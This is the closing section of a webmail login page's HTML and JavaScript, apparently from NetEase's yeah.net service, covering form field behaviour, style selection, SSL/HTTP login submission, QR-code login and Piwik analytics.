			sEventName = 'propertychange';
			var bIsIe = true;
		}else{
			sEventName = 'input';
			me.checkInputAlways();
		}
		var el = document.createElement('div');
		el.setAttribute('oninput', 'return');
		if(typeof el.oninput === 'function'){
			sEventName = 'input';
			if(bIsIe){
				me.checkInputAlways();
			}
		}
		fEventListen(oId, sEventName, me.idInputEvent);
		
		//&#28857;&#20987;&#21452;&#20987;&#25991;&#23383;
		fEventListen(oIdLabel, 'dblclick', function(){
			oId.focus();
		});
		fEventListen(oIdLabel, 'click', function(){
			oId.focus();
		});
		
		//&#23494;&#30721;
		fEventListen(oPwL,'mouseover',function(){
			fCls(oPwL, 'loginFormIpt-over', 'add');
		});
		fEventListen(oPwL,'mouseout',function(){
			fCls(oPwL, 'loginFormIpt-over', 'remove');
		});
		fEventListen(oPw,'focus',function(){
			fCls(oPw, 'loginFormTdIpt-focus', 'add');
			fCls(oPwL, 'loginFormIpt-focus', 'add');
		});
		fEventListen(oPw,'blur',function(){
			fCls(oPwL, 'loginFormIpt-focus', 'remove');
			if(oPw.value == ''){
				fCls(oPwL, 'showPlaceholder', 'add');
				fCls(oPw, 'loginFormTdIpt-focus', 'remove');
			}
		});
		fEventListen(oPw, sEventName, me.checkPw);
		//&#28857;&#20987;&#21452;&#20987;&#25991;&#23383;
		fEventListen(oPwLabel, 'dblclick', function(){
			oPw.focus();
		});
		fEventListen(oPwLabel, 'click', function(){
			oPw.focus();
		});
		
		//&#20004;&#21608;&#33258;&#21160;&#30331;&#24405;&#25991;&#23383; + &#20840;&#31243;ssl
		fEventListen($id('remAutoLogin'),'click',function(){
			if(oStyle.value == 3 || oStyle.value == 6){ // &#31616;&#32422;5/&#31616;&#32422;6
				$id('icoCheckbox').className = '';
				oSaveLogin.value = 0;
				if($id('allssl').checked){
					$id('icoCheckbox').className = '';
					$id('allssl').checked = false;				
				}else{
					$id('icoCheckbox').className = 'show';
					$id('allssl').checked = true;		
				}
			}else{ // &#20854;&#20182;&#39118;&#26684;
				$id('allssl').checked = false;
				$id('icoCheckbox').className = '';
				if(oSaveLogin.value == 0){
					$id('icoCheckbox').className = 'show';
					oSaveLogin.value = 1;
				}else{
					$id('icoCheckbox').className = '';
					oSaveLogin.value = 0;
				}
			}
		});
		//&#29256;&#26412;&#36873;&#25321;
		fEventListen($id('styleConf'),'click',function(){
			oStyleConfBlk.style.display = ( oStyleConfBlk.style.display == 'block' ? 'none' : 'block');
		});
		oStyleConfBlk.onmouseout = function(e){
			var oE = e || window.event;
			var that = this;
			_fE(function(){
				$id('styleConfBlock').style.display = 'none';
			}, oE, that);
		};
		//&#38459;&#27490;&#20107;&#20214;&#35302;&#21457;
		function _fE(fFunc, oE, oThat){
			var e = oE,
			relatedTarget = e.toElement || e.relatedTarget;
			while(relatedTarget && relatedTarget != oThat){
				relatedTarget = relatedTarget.parentNode;
			}
			if(!relatedTarget){
				fFunc();
			}
		}
	}

	/**
	 * &#29992;&#25143;&#21517;&#36755;&#20837;&#20107;&#20214;
	 */
	function fIdInputEvent(){
		var oShowDomain = $id('showdomain'),
			oInputTest = $id('idInputTest');
		if(oId.value == ''){
			fCls(oIdL, 'showPlaceholder', 'add');
			oInputTest.innerHTML = '';
			oShowDomain.style.display = 'none';
		}else{
			fCls(oIdL, 'showPlaceholder', 'remove');
			fCls(oId, 'loginFormTdIpt-focus', 'add');
			oShowDomain.style.display = 'block';
			oInputTest.innerHTML = oId.value;
			var tmpWidth = oInputTest.offsetWidth;
			oShowDomain.style.left = tmpWidth + 25 + 'px';
		}
	}

	/**
	 * &#26816;&#26597;&#23494;&#30721;&#36755;&#20837;&#26694;&#29366;&#24577;
	 */
	function fCheckPw(){
		if(oPw.value != ''){
			fCls(oPwL, 'showPlaceholder', 'remove');
			fCls(oPw, 'loginFormTdIpt-focus', 'add');
		}else{
			fCls(oPwL, 'showPlaceholder', 'add');
		}
	};

	/**
	 * &#25345;&#32493;&#26816;&#26597;&#36755;&#20837;&#26694;&#29366;&#24577;
	 */
	function fCheckInputAlways(){
		var me = this;
		window.oIntervalCheckInputAlways = setInterval(function(){
			me.idInputEvent();
			me.checkPw();
		},500);
	}

	/**
	 * &#35774;&#32622;&#29256;&#26412;
	 * @param  {Number} n &#29256;&#26412;&#21495;
	 */
	function fSetStyle(n){
		var me = this;
		var oStyleConfBlk = $id('styleConfBlock'),
			aVers = oStyleConfBlk.getElementsByTagName('a');
		for(var i=0, l=aVers.length; i<l; i++){
			aVers[i].className = '';
		}
		oStyle.value = n;
		$id('styleconf' + n).className = 'verSelected';
		$id('styleConfText').innerHTML = $id('styleconf' + n).innerHTML;
		oStyleConfBlk.style.display = 'none';
		$id('styleconf' + n).getElementsByTagName('b')[0].innerHTML = me.emuIconTick('colorRed'); // &#27169;&#25311;&#32418;&#33394;&#21246;
		// &#21028;&#26029;&#26159;&#21542;&#20840;&#31243;ssl
		if(n == 3 || n == 6){
			// &#31616;&#32422;5\&#31616;&#32422;6 &#26174;&#31034;&#20840;&#31243;ssl
			$id('remAutoLoginTxt').innerHTML = '&nbsp;&#20840;&#31243;SSL';
			$id('icoCheckbox').className = '';
			$id('savelogin').value = 0;
		}else{
			$id('remAutoLoginTxt').innerHTML = '&nbsp;&#21313;&#22825;&#20869;&#20813;&#30331;&#24405;';
			$id('allssl').checked = false;
		}
		me.shadowFix();
	}

	/**
	 * &#30331;&#24405;&#25552;&#20132;
	 * @return {Boolean}
	 */
	function fSubmitForm(){
		var me = this;
		//&#26816;&#26597;&#36755;&#20837;
		oId.value = fTrim(oId.value);
		if(oId.value == ''){
			alert('&#35831;&#36755;&#20837;&#24744;&#30340;&#24080;&#21495;!');
			oId.focus();
			return false;
		}
		
		$id('username').value = oId.value + '@' + gOption.sDomain;
		
		if(oPw.value.length == ''){
			alert('&#35831;&#36755;&#20837;&#24744;&#30340;&#23494;&#30721;!');
			oPw.focus();
			return false;
		}
		
		// starttime &#30331;&#24405;&#26102;&#38388;&#32479;&#35745;
		if(bStartTime){
			var sNow = new Date().getTime();
			fSetCookie("starttime",sNow,false);
			bStartTime = false;
		}
		
		/*//16&#20301;&#23494;&#30721;&#25130;&#26029;
		if(oPw.value.length > 16){
			oPw.value = oPw.value.substr(0,16);
		}*/
		
		//&#20648;&#23384;&#30331;&#24405;&#20449;&#24687;
		gUserInfo.username = oId.value;
		gUserInfo.style = oStyle.value;
		if(bIsFirstLog){
			//if($id('sslLogin').checked){
				gUserInfo.safe = 1;
				sLoginFunc = 'ssl';
			/*}else{
				gUserInfo.safe = 0;
				sLoginFunc = 'http';
			}*/
		}else{
			if(sLoginFunc == 'ssl'){	
				gUserInfo.safe = 1;
			}else{
				gUserInfo.safe = 0;
			}
		}
		gVisitorCookie.saveInfo();
		//&#24377;&#20986;&#36229;&#26102;&#23545;&#35805;&#26694;
		if(bIsFirstLog){
			sCoremailCookie = fGetCookie('Coremail');
			setTimeout(function(){
				//fShowTheHttpLogin();
				if(sLoginFunc == 'ssl'){
					sLoginFunc = 'http'
					me.submitForm();
				}
			},5000);
		}
		var sUrlDf = (function(){
						var sDf = fGetQueryHash('df');
						if(sDf == null){
							sDf = 'webmailyeah';
						}
						fSetCookie('df',sDf,false);
						return sDf;
					})(),
			sUrlUid = oId.value + '@' + gOption.sDomain;
		switch(sLoginFunc){
			case 'ssl' :
				var oForm = $id('loginyeah');
				oForm.action = gOption.sSslAction
				+ fUrlP('df',sUrlDf,true)
				+ fUrlP('from','web')
				+ fUrlP('funcid','loginone')
				+ fUrlP('iframe','1')
				+ fUrlP('language','-1')
				// + fUrlP('net',sLocationInfo)
				+ fUrlP('passtype','1')
				+ fUrlP('verifycookie','1')
				+ fUrlP('product', gOption.product)
				// + fUrlP('race',sUrlRace)
				+ fUrlP('style', oStyle.value)
				+ fUrlP('uid', sUrlUid)
				+ ($id('allssl').checked ? fUrlP('allssl', 'true') : '');
				if(bIsFirstLog){
					bIsFirstLog = false;
					return true;
				}else{
					oForm.submit();
				}
				break;
			case 'http' :
				window.sHttpAction  = gOption.url 
				+ fUrlP('df',sUrlDf,true)
				+ fUrlP('lightweight','1')
				+ fUrlP('verifycookie','1')
				+ fUrlP('from','web')
				+ fUrlP('language','-1')
				// + fUrlP('net',sLocationInfo)
				// + fUrlP('race',sUrlRace)
				+ fUrlP('style', oStyle.value)
				+ fUrlP('uid', sUrlUid);
				loginRequest('fEnData');
				return false;
				break;
			default :;
		}
		return false;
	}

	/**
	 * &#26131;&#20449;&#20108;&#32500;&#30721;&#30331;&#24405;
	 */
	function fShowYXCode(){
		var oYxLoginBtn = $id('yxLoginBtn');
		var bShowCode = true,
			bStartPoll = false;
		var _fShowCodeTimeout = function(){
			setTimeout(function(){
				if(bShowCode){
					$id('loginByYX').style.display = 'block';
					fEventListen(document,'click',_fHideCode);
					if(bStartPoll){
						return;
					}else{
						yixinLogin.init();
						bStartPoll = true;
					}
				}else{
					bShowCode = true;
				}
			},300);
		};
		var _fSetShowCodeTimeout = function(){
			bShowCode = false;
		};

		fEventListen(oYxLoginBtn,'mouseover',_fShowCodeTimeout);
		fEventListen(oYxLoginBtn,'mouseout',_fSetShowCodeTimeout);

		// &#38544;&#34255;&#38169;&#35823;&#20449;&#24687;&#25552;&#31034;
		function _fHideCode(e){
			var evt = window.event ? window.event: e,
				target = evt.srcElement || evt.target;
			var bMe = false;
			var oEle = target;
			while(oEle.tagName.toUpperCase() != 'BODY'){ 
				if(oEle == $id('loginByYX')){ 
					bMe = true;
					break;
				}
				oEle = oEle.parentNode;
			}
			if(!bMe && target.id != 'loginByYX' && target.id != 'yxLoginBtn'){
				$id('loginByYX').style.display = 'none';
				bShowCode = true;
				fEventUnlisten(document,'click',_fHideCode);
			}
		}
	}

	/**
	 * ssl&#38142;&#25509;&#39044;&#21152;&#36733;&#26816;&#27979;
	 * @param  {String} s load&#65306;ssl&#25509;&#21475;&#27491;&#24120; | err&#65306;&#25509;&#21475;&#38169;&#35823;
	 */
	function fCheckHttps(s){
		var oLogin =$id('loginBtn');
		var sTitle = '';
		switch(s){
			case 'load' :
				$id('sslLogin').checked = true;
				sTitle = '&#27491;&#22312;&#20351;&#29992;SSL&#26041;&#24335;&#30331;&#24405;';
				break;
			case 'err' :
				$id('sslLogin').checked = false;
				sTitle = '&#26222;&#36890;&#21152;&#23494;&#26041;&#24335;&#30331;&#24405;';
				break;
			default :;
		}
		oLogin.title = sTitle;
		return;
	}

	/**
	 * &#27169;&#25311;&#22270;&#26631;
	 * @param  {Array} aPixel &#21442;&#25968;&#25968;&#32452;
	 * @return {String}       html&#23383;&#31526;&#20018;
	 */
	function fEmuIcon(aPixel){
		var sHtml = '';
		for(var i = 0; i < aPixel.length; i++){
			var sPixelHtml = '<i style="position:absolute;height:' + aPixel[i].height + 'px;overflow:hidden;left:' + aPixel[i].x + 'px;top:' + aPixel[i].y + 'px;width:' + aPixel[i].width + 'px; background-color:#' + aPixel[i].color + '"></i>'
			sHtml += sPixelHtml;
		}
		return sHtml;
	}

	/**
	 * &#27169;&#25311;&#23545;&#21246;&#22270;&#26631;
	 * @param  {String} s colorWhite&#65306;&#30333;&#33394;&#21246; | colorRed&#65306;&#32418;&#33394;&#21246;
	 * @return {String}   html&#23383;&#31526;&#20018;
	 */
	function fEmuIconTick(s){
		var me = this;
		var oConf = {
			 colorWhite : ['b2b2b2', 'fff', '8c8c8c', 'd9d9d9']
			,colorRed : ['df8588', 'bf0b10', 'efc3c4', 'cf484c']
		}
		var aConf = [
			 {x : 10, y : 3, width : 1, height : 1, color : oConf[s][0]}
			,{x : 9, y : 4, width : 1, height : 1, color : oConf[s][0]}
			,{x : 10, y : 4, width : 1, height : 1, color : oConf[s][1]}
			,{x : 8, y : 5, width : 1, height : 1, color : oConf[s][0]}
			,{x : 9, y : 5, width : 2, height : 1, color : oConf[s][1]}
			,{x : 2, y : 6, width : 1, height : 1, color : oConf[s][2]}
			,{x : 3, y : 6, width : 1, height : 1, color : oConf[s][3]}
			,{x : 4, y : 6, width : 1, height : 1, color : oConf[s][0]}
			,{x : 7, y : 6, width : 1, height : 1, color : oConf[s][0]}
			,{x : 8, y : 6, width : 2, height : 1, color : oConf[s][1]}
			,{x : 10, y : 6, width : 1, height : 1, color : oConf[s][0]}
			,{x : 2, y : 7, width : 1, height : 1, color : oConf[s][0]}
			,{x : 3, y : 7, width : 2, height : 1, color : oConf[s][1]}
			,{x : 5, y : 7, width : 2, height : 1, color : oConf[s][0]}
			,{x : 7, y : 7, width : 2, height : 1, color : oConf[s][1]}
			,{x : 9, y : 7, width : 1, height : 1, color : oConf[s][0]}
			,{x : 3, y : 8, width : 1, height : 1, color : oConf[s][0]}
			,{x : 4, y : 8, width : 4, height : 1, color : oConf[s][1]}
			,{x : 8, y : 8, width : 1, height : 1, color : oConf[s][0]}
			,{x : 4, y : 9, width : 1, height : 1, color : oConf[s][0]}
			,{x : 5, y : 9, width : 2, height : 1, color : oConf[s][1]}
			,{x : 7, y : 9, width : 1, height : 1, color : oConf[s][0]}
			,{x : 5, y : 10, width : 2, height : 1, color : oConf[s][0]}
		];
		return me.emuIcon(aConf);
	}

	/**
	 * &#27169;&#25311;&#38452;&#24433;
	 */
	function fShadowFix(){
		if(!(typeof document.body.style.textShadow === 'undefined')){
			return;
		}
		// &#28165;&#38500;&#37325;&#32622;
		if(aShadowFix.length > 0){
			for(var i=0; i<aShadowFix.length; i++){
				var sShadowId = aShadowFix[i];
				var oShadowObj = $id(sShadowId);
				if(oShadowObj){
					oShadowObj.parentNode.removeChild(oShadowObj);
				}
			}
			aShadowFix = [];
		}
		var nShadowColor = '#000';
		var aNeedFix = [
			$id('remAutoLoginTxt'),
			$id('lfBtnReg'),
			$id('forgetPass'),
			$id('styleConfText'),
			$id('yxLoginBtn'),
			$id('footerTxt')
		];
		for(var i=0; i<aNeedFix.length; i++){
			_fCreateShadow(aNeedFix[i]);
		}
		
		function _fCreateShadow(o){
			var bCenter = false;
			var oC = o.cloneNode(true);
			var nZindex = 2;
			var oParent = o.parentNode;
			if(o.currentStyle){
				if(o.currentStyle.position == 'static'){
					o.style.position = 'relative';
				}
				if(o.currentStyle.zIndex != 'auto'){
					nZindex = o.currentStyle.zIndex;
				}
				if(o.currentStyle.margin == '0px auto'){
					bCenter = true;
				}
			}
			o.style.zIndex = nZindex;
			var nLeft = o.offsetLeft;
			var nTop = o.offsetTop;
			oC.id = o.id + 'shadow';
			aShadowFix.push(oC.id);
			oC.style.color = nShadowColor;
			var aHrefArray = oC.getElementsByTagName('*');
			for(var j=0; j<aHrefArray.length; j++){
				var oj = aHrefArray[j];
				if(oj){
					if(oj.id){
						oj.id = oj.id + 'shadow';
						aShadowFix.push(oj.id);
					}
					if(oj.currentStyle){
						if(oj.currentStyle.color != nShadowColor){
							oj.style.color = nShadowColor;
						}
					}
				}
			}
			if(bCenter){
				oC.style.position = 'relative';
				oC.style.top = nTop - (o.offsetHeight) + 'px';
				oC.style.paddingLeft = '1px';
				oC.style.paddingTop = '1px';
				oC.style.zIndex = nZindex - 1;
			}else{
				oC.style.position = 'absolute';
				oC.style.zIndex = nZindex - 1;
				oC.style.left = nLeft + 1 + 'px';
				oC.style.top = nTop + 1 + 'px';
				oC.style.width = 'auto';
			}
			oParent.appendChild(oC);
		}
	}

	/**
	 * &#29305;&#27530;&#22788;&#29702;&#31364;&#23631;&#19979;&#30340;&#29256;&#26412;&#36873;&#25321;&#30028;&#38754;
	 */
	function fFixNarrowScreen(){
		try{
			var nCw = document.documentElement.clientWidth;
			if(nCw < 1100){
				$id('styleconf5').style.width = '125px';
				$id('styleconf7').style.width = '125px';

				$id('jy5txt').innerHTML = '5.0&#31616;&#32422;&#29256;';
				$id('styleconf3').style.width = '90px';

				$id('jy6txt').innerHTML = '6.0&#31616;&#32422;&#29256;';
				$id('styleconf6').style.width = '90px';

				$id('styleConfBlock').style.width = '350px';
			}else{
				$id('styleconf5').style.width = '150px';
				$id('styleconf7').style.width = '150px';

				$id('jy5txt').innerHTML = '&#32593;&#26131;&#37038;&#31665;5.0&#31616;&#32422;&#29256;';
				$id('styleconf3').style.width = '150px';

				$id('jy6txt').innerHTML = '&#32593;&#26131;&#37038;&#31665;6.0&#31616;&#32422;&#29256;';
				$id('styleconf6').style.width = '150px';

				$id('styleConfBlock').style.width = '442px';
			}
		}catch(e){}
	}
})(window);

/**
 * &#28155;&#21152;&#21024;&#38500;classname
 * @param  {Object} o     &#20462;&#25913;&#23545;&#35937;dom&#20803;&#32032;
 * @param  {String} sCls  classname
 * @param  {String} sFunc &#20462;&#25913;classname&#26041;&#24335;&#65306;add/remove
 */
function fCls(o, sCls, sFunc){
	var oTar = o;
	var nRes = oTar.className.indexOf(sCls);
	if(sFunc == 'add'){
		if(nRes == -1){
			oTar.className = oTar.className + ' ' + sCls;
		}else{
			return;
		}
	}
	if(sFunc == 'remove'){
		if(nRes != -1){
			var sCls = '\\s' + sCls
			var rCls = new RegExp(sCls, 'g');
			oTar.className = oTar.className.replace(rCls, '');
		}else{
			return;
		}
	}
}	
	
window.onload = function(){
	indexLogin.init();
	// fq&#32479;&#35745;
	fFQ();
	// &#25512;&#24191;&#26356;&#26032;&#21518;&#21488;
	loginExtAD.init();
	// piwik &#36755;&#20986;1%&#30340;&#26085;&#24535;
	if(fRandom(100) <= 1){
		var pkBaseURL = "http://pstat.mail.163.com/";
		fGetScript(pkBaseURL + 'piwik.js', function(){
			try{
				var piwikTracker = Piwik.getTracker(pkBaseURL + "piwik.php", 16);
				piwikTracker.trackPageView();
				piwikTracker.enableLinkTracking();
			}catch(err){}
		});
	}
};

</script>

<!-- &#39044;&#21152;&#36733;&#26497;&#36895;js -->
<iframe src="http://mail.163.com/preload6.htm" style="display:none" id="frmJs6"></iframe>
<!-- &#26131;&#20449;&#20108;&#32500;&#30721;&#30331;&#24405; -->
<script type="text/javascript" src="http://mimg.127.net/index/lib/scripts/yxlogin.js"></script>

<!-- Piwik -->
<noscript><p><img src="http://pstat.mail.163.com/piwik.php?idsite=16" style="border:0" alt="" /></p></noscript>
<!-- End Piwik Tracking Code -->

<!--ssl&#38142;&#25509;&#39044;&#21152;&#36733;-->
<img src="https://ssl.mail.yeah.net/httpsEnable.gif" width="0" height="0" style="display:block;" alt="https preload" onload="indexLogin.checkHttps('load');" onerror="indexLogin.checkHttps('err');"/>
</body>
</html>